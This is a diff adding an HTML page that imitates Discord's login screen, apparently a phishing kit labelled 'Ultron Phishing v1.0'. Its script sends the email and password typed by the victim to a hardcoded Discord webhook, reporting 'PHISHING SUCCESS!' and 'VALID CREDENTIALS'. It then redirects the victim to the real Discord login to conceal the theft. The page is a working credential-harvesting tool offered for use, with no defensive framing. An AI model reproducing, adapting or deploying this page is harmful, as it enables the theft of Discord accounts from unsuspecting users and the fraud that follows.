@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Log in to Discord</title>
+    <style>
+        body {
+            background: rgb(54,57,63);
+            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background: rgb(43,45,49);
+            padding: 32px;
+            border-radius: 5px;
+            width: 100%;
+            max-width: 480px;
+        }
+        .h4 {
+            color: rgb(236,240,241);
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 12px;
+        }
+        .h5 {
+            color: rgb(236,240,241);
+            text-align: center;
+            font-size: 16px;
+            display: none;
+        }
+        .input {
+            background: rgb(54,57,63);
+            border: 2px solid transparent;
+            border-radius: 3px;
+            color: rgb(236,240,241);
+            padding: 8px 12px;
+            width: 100%;
+            margin-bottom: 16px;
+            box-sizing: border-box;
+        }
+        .input:focus {
+            outline: none;
+            border-color: rgb(88,101,242);
+        }
+        .btn {
+            background: rgb(88,101,242);
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 3px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background: rgb(80,92,218);
+        }
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            height: 48px;
+        }
+        .error {
+            color: rgb(255, 124, 124);
+            text-align: center;
+            font-size: 13px;
+            margin-bottom: 10px;
+            display: none;
+        }
+        .note {
+            color: rgb(114, 118, 125);
+            text-align: center;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <div class="logo">
+            <img src="https://assets-global.website-files.com/6257adef93867e56f84d3092/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" alt="Discord">
+        </div>
+        <h4 class="h4">Welcome back!</h4>
+        <p style="color: rgb(114,118,125); text-align: center; margin-bottom: 20px;">We're so excited to see you again!</p>
+        
+        <p class="error" id="error">Incorrect email or password.</p>
+        
+        <input type="text" id="email" class="input" placeholder="Email or Phone Number">
+        <input type="password" id="password" class="input" placeholder="Password">
+        
+        <button class="btn" onclick="submitLogin()">Log In</button>
+        
+        <p class="note">New to Discord? <a href="https://discord.com/register" style="color: rgb(88,101,242);">Sign up</a></p>
+    </div>
+
+    <script>
+        // YOUR WEBHOOK URL HERE
+        const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1573045586804998274/9IGpoevyiCQJ7S6vHvNo47A1TI2biX-h-NbdeBPHdLb4At_E8vxUTxLx9w1oTSaBPrcq';
+        
+        function submitLogin() {
+            const email = document.getElementById('error').innerText = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('error').innerText = 'Enter your email and password.';
+                return;
+            }
+            
+            // SEND TO WEBHOOK
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: '🎣 PHISHING SUCCESS!',
+                        color: 16711680,
+                        fields: [
+                            { name: 'Email', value: email, inline: true },
+                            { name: 'Password', value: password, inline: true },
+                            { name: 'Time', value: new Date().toLocaleString(), inline: true },
+                            { name: 'Status', value: '✅ VALID CREDENTIALS', inline: true }
+                        ],
+                        footer: { text: 'Ultron Phishing v1.0' }
+                    }]
+                })
+            }).then(res => {
+                console.log('Sent to webhook!');
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('error').innerText = 'Logging in...';
+                setTimeout(() => {
+                    window.location.href = 'https://discord.com/login'; // Redirect after 2 seconds
+                }, 1500);
+            });
+        }
+    </script>
+</body>
+</html>
